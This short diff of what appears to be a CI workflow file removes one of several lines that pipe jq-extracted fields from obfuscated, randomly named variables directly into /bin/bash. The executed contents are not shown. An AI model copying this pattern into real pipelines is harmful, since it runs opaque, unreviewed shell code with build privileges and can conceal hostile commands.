@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$uijf45027" | jq -r .rlpvz6542 | /bin/bash
           echo $tqm90 | jq -r .qj1057 | /bin/bash
           echo $mmmdr0 | jq -r .mj72926 | /bin/bash
-          printf '%s' "$ocrj27185" | jq -r .ox01196 | /bin/bash
           echo $cgdir0 | jq -r .m16 | /bin/bash
 
       - name: Upload artifact
